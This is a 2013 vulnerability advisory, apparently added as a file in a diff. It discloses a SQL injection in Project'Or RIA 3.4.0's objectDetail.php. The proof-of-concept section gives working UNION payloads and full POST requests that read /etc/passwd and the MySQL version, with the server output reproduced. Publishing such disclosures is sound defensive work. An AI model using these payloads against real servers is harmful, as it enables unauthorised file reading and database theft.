@@ -1,0 +1,266 @@
+=============================================
+INTERNET SECURITY AUDITORS ALERT 2013-017
+- Original release date: July 26th, 2013
+- Last revised:  July 26th, 2013
+- Discovered by: Vicente Aguilera Diaz
+- Severity: 6.8/10 (CVSSv2 Base Scored)
+- CVE-ID: CVE-2013-6164
+=============================================
+
+I. VULNERABILITY
+-------------------------
+SQL Injection vulnerability in "Project'Or RIA" allow arbitrary access
+to the database and the file system.
+
+
+II. BACKGROUND
+-------------------------
+Project'Or RIA is an open source Project Management Software, trying to
+gather in a single tool every functionality needed to organize your
+projects.
+The objective is to keep it simple, easy to use on a day to day
+activity, while covering most of the project management functionalities.
+
+
+III. DESCRIPTION
+-------------------------
+Has been detected a SQL Injection vulnerability in the "Affectations"
+functionality of this application. The affected resource and parameter
+are the
+
+following:
+
+Resource:
+    /view/objectDetail.php
+
+Parameter:
+    objectId
+
+This vulnerability allows the execution of arbitrary SQL code against
+the database, and arbitrary access to the file system.
+
+
+IV. PROOF OF CONCEPT
+-------------------------
+When a user access to the "Environmental parameters / Affectations"
+functionality, is generated a output with a list of resources. If a user
+access to the de
+
+tails of a resource, is generated a request as follows:
+
+    POST /view/objectDetail.php?destinationWidth=1017 HTTP/1.1
+    Host: <projectorria-server>
+
+    objectClass=Affectation&objectId=000042&listIdFilter=&listFilterClause=
+
+where the "objectId" value contains the resource identifier.
+
+A malicious user can inject arbitrary SQL code in the <objecId>
+parameters of this request. For example:
+
+1. Accessing the file system
+1.1 /etc/passwd
+Modified parameter:
+     <objectId>
+
+Value:
+    
+99942+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)
+
+Request:
+
+POST /view/objectDetail.php?destinationWidth=1017 HTTP/1.1
+Host: <projectorria-server>
+
+objectClass=Affectation&objectId=99942+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual)
+
+&listIdFilter=&listFilterClause=
+
+Response:
+HTTP/1.1 200 OK
+
+...
+<span dojoType="dijit.form.TextBox" type="text"   id="id" name="id" 
+class="display"  readonly tabindex="-1" style="width: 75px;" 
+
+value="root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+whoopsie:x:102:104::/nonexistent:/bin/false
+landscape:x:103:105::/var/lib/landscape:/bin/false
+messagebus:x:104:108::/var/run/dbus:/bin/false
+ntpd:x:105:111::/var/run/openntpd:/bin/false
+postfix:x:106:113::/var/spool/postfix:/bin/false
+babynus:x:1000:1000::/home/babynus:/bin/bash
+bind:x:107:115::/var/cache/bind:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+zend:x:109:116::/usr/local/zend/gui/lighttpd/:/bin/false
+mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
+nagios:x:111:118::/var/lib/nagios:/bin/false
+smmta:x:112:119:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:113:120:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+" ></span>
+...
+
+Obtained info (/etc/passw):
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+whoopsie:x:102:104::/nonexistent:/bin/false
+landscape:x:103:105::/var/lib/landscape:/bin/false
+messagebus:x:104:108::/var/run/dbus:/bin/false
+ntpd:x:105:111::/var/run/openntpd:/bin/false
+postfix:x:106:113::/var/spool/postfix:/bin/false
+babynus:x:1000:1000::/home/babynus:/bin/bash
+bind:x:107:115::/var/cache/bind:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+zend:x:109:116::/usr/local/zend/gui/lighttpd/:/bin/false
+mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
+nagios:x:111:118::/var/lib/nagios:/bin/false
+smmta:x:112:119:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:113:120:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
+
+2. Obtaining database private information
+2.1 Obtaining TABLE_NAME from INFORMATION_sCHEMA.TABLES
+Modified parameter:
+     <objectId>
+
+Value:
+    
+99942+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)
+
+Request:
+
+POST /view/objectDetail.php?destinationWidth=1017 HTTP/1.1
+Host: <projectorria-server>
+
+objectClass=Affectation&objectId=99942+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)
+
+&listIdFilter=&listFilterClause=
+
+Response:
+HTTP/1.1 200 OK
+
+<span dojoType="dijit.form.TextBox" type="text"   id="id" name="id" 
+class="display"  readonly tabindex="-1" style="width: 75px;"  value="5.5.24-
+
+0ubuntu0.12.04.1" >
+
+Obtained info (MySQL Version):
+5.5.24-0ubuntu0.12.04.1
+
+
+V. BUSINESS IMPACT
+-------------------------
+An attacker can execute arbitrary SQL code and gain access to private
+information stored in the database or the file system.
+ 
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Tested in Project'Or RIA v3.4.0
+ 
+
+VII. SOLUTION
+-------------------------
+Pending.
+
+
+VIII. REFERENCES
+-------------------------
+http://projectorria.org
+http://www.isecauditors.com
+
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered by Vicente Aguilera Diaz
+(vaguilera (at) isecauditors (dot) com).
+
+
+X. REVISION HISTORY
+-------------------------
+July    26, 2013: Initial release
+
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+July      25, 2013: Vulnerability acquired by Internet Security Auditors
+(www.isecauditors.com).
+September 26, 2013: Sent to project support.
+November  03, 2013: New release and disclosure.
+
+
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. Internet
+Security
+
+Auditors accepts no responsibility for any damage caused by the use or
+misuse of this information.
+
+
+XIII. ABOUT
+-------------------------
+Internet Security Auditors is a Spain based leader in web application
+testing, network security, penetration testing, security compliance
+implementation and
+
+assessing. Our clients include some of the largest companies in areas
+such as finance, telecommunications, insurance, ITC, etc. We are vendor
+independent
+
+provider with a deep expertise since 2001. Our efforts in R&D include
+vulnerability research, open security project collaboration and
+whitepapers,
+
+presentations and security events participation and promotion. For
+further information regarding our security services, contact us.
+
+
+XIV. FOLLOW US
+-------------------------
+You can follow Internet Security Auditors, news and security advisories at:
+https://www.facebook.com/ISecAuditors
+https://twitter.com/ISecAuditors
+http://www.linkedin.com/company/internet-security-auditors
+http://www.youtube.com/user/ISecAuditors
